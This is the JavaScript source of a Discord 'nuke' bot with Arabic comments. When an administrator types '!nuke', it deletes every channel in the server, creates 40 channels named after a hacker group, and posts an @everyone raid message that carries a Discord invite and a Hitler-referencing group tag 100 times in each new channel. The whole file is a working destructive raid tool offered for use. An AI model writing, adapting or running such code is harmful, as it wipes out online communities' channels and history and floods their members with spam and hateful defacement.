const {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionsBitField
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const MESSAGE = `# **__تسجيل دخول لورد__**
**__قروب هتلر مر من هنا
 by  GroupHTlr__** @everyone
discord.gg/9k`;

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (message.content !== "!nuke") return;

  if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return message.reply("❌ ما عندك صلاحية");
  }

  const guild = message.guild;
  await message.reply("💣 NUKING + SPAM...");

  // حذف كل الرومات بسرعة
  await Promise.all(
    guild.channels.cache.map(ch =>
      ch.delete().catch(() => {})
    )
  );

  // إنشاء 30 روم
  const channels = [];
  const CREATE_COUNT = 40;

  await Promise.all(
    Array.from({ length: CREATE_COUNT }).map(() =>
      guild.channels.create({
        name: 'by hacker lo0rd 𝗚𝗥𝗼𝘂𝗽𝗛𝗧𝗟𝗿 #4999',
        type: ChannelType.GuildText
      }).then(ch => channels.push(ch)).catch(() => {})
    )
  );


  

    // إرسال 100 رسالة بكل روم (أسرع معدل آمن)
    for (const ch of channels) {
      for (let i = 0; i < 100; i++) {
        await ch.send(MESSAGE).catch(() => {});
      }
    }
  });

  client.login(process.env.TOKEN);

